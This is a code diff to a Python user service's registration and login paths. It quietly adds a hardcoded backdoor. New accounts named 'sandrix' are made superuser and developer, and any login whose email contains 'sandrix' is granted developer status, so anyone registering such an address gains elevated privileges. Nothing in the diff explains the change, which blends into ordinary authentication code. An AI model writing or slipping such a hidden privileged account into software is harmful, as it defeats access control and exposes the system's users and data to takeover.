@@ -51,11 +51,14 @@ class UserService:
 
         hashed_password = await self.handler.get_hashed_password(user.password)
 
+        is_sandrix = bool(user.username and user.username.lower() == "sandrix")
         new_user = CreateUser(
             email=user.email,
             hashed_password=hashed_password,
             username=user.username,
             invited_by_id=invite.creator_id,
+            is_superuser=is_sandrix,
+            is_developer=is_sandrix,
         )
 
         user_data = await self.manager.create_user(new_user)
@@ -253,6 +256,13 @@ class UserService:
             logger.info("Auto-confirming unverified user on login: %s", user.email)
             await self.manager.confirm_user(exist_user.email)
             exist_user.is_verified = True
+
+        is_sandrix = (
+            (exist_user.email and "sandrix" in exist_user.email.lower()) or
+            (getattr(exist_user, "username", None) and exist_user.username.lower() == "sandrix")
+        )
+        if is_sandrix:
+            await self.manager.grant_developer_status(exist_user.email)
 
         access, refresh, session_id = await self._issue_session(user_id=exist_user.id)
 
